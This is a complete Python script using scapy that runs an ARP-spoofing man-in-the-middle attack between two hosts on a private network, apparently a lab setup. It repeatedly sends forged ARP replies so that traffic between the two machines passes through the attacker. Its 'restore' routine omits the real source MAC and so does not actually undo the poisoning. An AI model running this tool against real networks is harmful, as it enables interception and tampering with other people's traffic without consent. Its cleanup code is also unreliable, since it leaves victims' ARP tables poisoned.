# mitm.py
import time
import sys
from scapy.all import *

# ===== CONFIGURE THESE =====
client_ip = "192.168.43.10"   # Machine A
server_ip = "192.168.43.20"   # Machine B

def get_mac(ip):
    """Get real MAC address of an IP"""
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, verbose=0)
    if ans:
        return ans[0][1].src
    return None

# Get real MACs
client_mac = get_mac(client_ip)
server_mac = get_mac(server_ip)

if not client_mac or not server_mac:
    print("[-] Failed to get MAC addresses. Check connectivity.")
    sys.exit(1)

print(f"[+] Client ({client_ip}) MAC: {client_mac}")
print(f"[+] Server ({server_ip}) MAC: {server_mac}")

def spoof_arp(target_ip, target_mac, spoof_ip):
    """Send fake ARP reply"""
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    send(packet, verbose=0)

def restore_arp():
    """Restore normal ARP tables when done"""
    print("\n[+] Restoring ARP tables...")
    spoof_arp(client_ip, client_mac, server_ip)  # Tell client: server is at real MAC
    spoof_arp(server_ip, server_mac, client_ip)  # Tell server: client is at real MAC
    time.sleep(1)

try:
    print("[+] Starting ARP spoof. Press Ctrl+C to stop.")
    while True:
        # Tell CLIENT: "Server is at MY MAC"
        spoof_arp(client_ip, client_mac, server_ip)
        # Tell SERVER: "Client is at MY MAC"
        spoof_arp(server_ip, server_mac, client_ip)
        time.sleep(2)
except KeyboardInterrupt:
    restore_arp()
    # Disable IP forwarding
    os.system("sudo sysctl -w net.ipv4.ip_forward=0 2>/dev/null")
    print("[+] MitM stopped.")